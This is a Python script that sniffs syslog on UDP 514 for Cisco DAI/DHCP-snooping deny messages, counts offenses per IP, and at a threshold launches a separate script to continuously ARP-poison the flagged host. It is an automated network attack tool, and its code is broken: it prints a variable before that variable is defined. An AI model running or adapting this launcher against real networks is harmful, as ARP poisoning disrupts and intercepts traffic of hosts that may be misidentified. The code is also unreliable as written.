import subprocess
import sys
from scapy.all import sniff, UDP
import re
from collections import defaultdict

INTERFACE = "lo"  # change to your interface
THRESHOLD = 3  # number of errors required before attack is triggered

# Track how many times each IP has errored
error_counts = defaultdict(int)

# Regex to extract MAC/IP pairs
mac_ip_pattern = re.compile(
    r'\(?\[\s*([0-9a-fA-F\.:]{4,17})/(\d{1,3}(?:\.\d{1,3}){3})',
    re.IGNORECASE
)

def start_poison_terminal(ip):
    print(f"[ACTION] Starting continuous ARP poison on {ip}")
    cmd = [
        "gnome-terminal", "--",
        sys.executable, "desertarpLoop.py", ip, INTERFACE
    ]
    subprocess.Popen(cmd)

def process_syslog(pkt):
    print(f"[MESSAGE] {message.strip()}")
    if UDP in pkt and pkt[UDP].dport == 514:
        try:
            message = bytes(pkt[UDP].payload).decode(errors="ignore")
        except:
            return
        print(f"[SYSLOG] {message.strip()}")
        if "%SW_DAI-4-DHCP_SNOOPING_DENY" in message:
            match = mac_ip_pattern.search(message)
            if match:
                attacker_mac = match.group(1)
                attacker_ip = match.group(2)
                
                # Update and print the count
                error_counts[attacker_ip] += 1
                print(f"[DETECTED] {attacker_ip} triggered DAI {error_counts[attacker_ip]} time(s).")

                # Trigger ARP poison only if above threshold
                if error_counts[attacker_ip] == THRESHOLD:
                    print(f"[THRESHOLD REACHED] Triggering ARP poison for {attacker_ip}")
                    start_poison_terminal(attacker_ip)




if __name__ == "__main__":
    input("Press Enter to start monitoring...")
    print(f"Monitoring syslog messages on UDP 514, interface {INTERFACE}")
    sniff(filter="udp port 514", prn=process_syslog, store=0)